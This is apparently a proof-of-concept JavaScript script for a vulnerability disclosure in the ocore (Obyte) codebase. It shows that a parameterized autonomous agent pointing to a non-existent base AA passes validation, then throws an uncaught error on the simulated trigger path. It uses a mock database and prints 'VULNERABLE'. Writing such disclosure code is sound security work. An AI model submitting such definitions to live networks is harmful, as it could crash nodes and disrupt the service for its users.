"use strict";
// Run from ocore root: node poc_base_aa.js

const objectHash = require('./object_hash.js');
const aa_validation = require('./aa_validation.js');
const storage = require('./storage.js');

// valid-format address that is not an AA
const FAKE_BASE_AA = 'MXMEKGN37H5QO2AWHT7XRG6LHJVVTAWU';

const definition = ["autonomous agent", {
    base_aa: FAKE_BASE_AA,
    params: { key: "value" }
}];

const aaAddress = objectHash.getChash160(definition);

console.log('AA: ' + aaAddress);
console.log('base_aa: ' + FAKE_BASE_AA);

process.once('uncaughtException', (e) => {
    console.log('\n[CRASH] ' + e.message);
    console.log('[FILE] ' + e.stack.split('\n')[1].trim());
    console.log('[RESULT] VULNERABLE');
    process.exit(0);
});

// step 1: validation passes (this is the bug)
aa_validation.validateAADefinition(definition, (err) => {
    if (err) {
        console.log('[FAIL] validation rejected: ' + err);
        process.exit(1);
    }
    console.log('[PASS] validation accepted parameterized AA with non-existent base_aa');

    // step 2: simulate trigger execution path
    // this is what handleTrigger does when AA is triggered
    const mockConn = {
        query: (sql, params, cb) => {
            // simulate aa_addresses table lookup returning no rows
            cb([]);
        }
    };

    storage.readAADefinition(mockConn, FAKE_BASE_AA, (arrBaseDefinition) => {
        if (!arrBaseDefinition) {
            // this is the exact code from aa_composer.js handleTrigger line 411-412
            throw Error("base AA not found: " + FAKE_BASE_AA);
        }
    });
});
